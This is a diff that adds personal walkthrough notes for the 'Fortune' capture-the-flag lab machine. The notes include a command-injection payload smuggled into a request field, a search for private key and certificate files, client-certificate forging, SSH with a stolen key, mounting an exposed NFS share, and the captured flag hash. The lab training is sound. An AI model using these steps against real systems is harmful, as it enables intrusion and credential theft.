@@ -1,0 +1,61 @@
+#10.10.10.127
+#PORT- 22, 80, 443
+
+#nmap
+#dirb- fortune, select, 
+
+#found RCE on webpage
+#intercept request from webpage and add this
+db=fortune ;ls -la /home/
+
+#found 3 users --> bob, charlie, nfsuser
+#found some certificates inside 'bob' user folder
+#search all certs using this
+find / -name '*.pem' 2>/dev/null   -->  /home/bob/ca/newcerts/1000.pem ,  /home/bob/ca/intermediate/private/intermediate.key.pem 
+
+#now use these certificates to create client certificate so we can access port 443
+>>>https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html
+openssl pkcs12 -export -out Cert.p12 -in 1000.pem -inkey intermediate.key.pem
+
+#now upload the 'Cert.p12' onto browser 
+#now access -->  https://10.10.10.127
+
+#found private key for user 'nfsuser'
+#save 'RSA PRIVATE KEY' into 'priv_key.pem'
+
+#learn about authpf
+#Authpf is an utility for authenticating gateways, so we need to configure our gateway (our attacker machine is consider as a Gateway) to be able to connect.
+>>>https://man.openbsd.org/authpf
+>>>https://www.openbsd.org/faq/pf/authpf.html
+
+ssh -i priv_key.pem nfsuser@10.10.10.127		(do this from root shell)
+#authenticated from host(tun0 ip)
+NOTE:- don't stop this process
+
+#now do nmap again
+#nmap- 111, 2049, 8081
+
+#enumrate port 8081
+#access  -->  http://10.10.10.127:8081
+#found msg- "The pgadmin4 service is temproarily unavailable. See Charlie for details."
+#that means there is pgadmin4 service is running on server
+
+#enumrate port 2049 -->  Network File System (NFS) - remote filesystem access
+#use this link to enumrate port 2049
+>>>https://resources.infosecinstitute.com/exploiting-nfs-share/#gref
+#list the accessible shares of the remote system
+showmount -e 10.10.10.127
+#found '/home' is accessible for everyone
+#create mount point on local system for '/home' directory
+#make directory "/root/Documents/htb/Fortune (OpenBSD)/mnt"
+mkdir "/root/Documents/htb/Fortune (OpenBSD)/mnt"
+mount -t nfs 10.10.10.127:/home "/root/Documents/htb/Fortune (OpenBSD)/mnt/"     (do this from root shell)
+
+#now switch back to ash's shell to access the mounted directory from terminal
+#access '/root/Documents/htb/Fortune (OpenBSD)/mnt/' drive
+#found user.txt inside charlie user
+
+	
+#key
+ada0affd040090a6daede65f10737c40
+
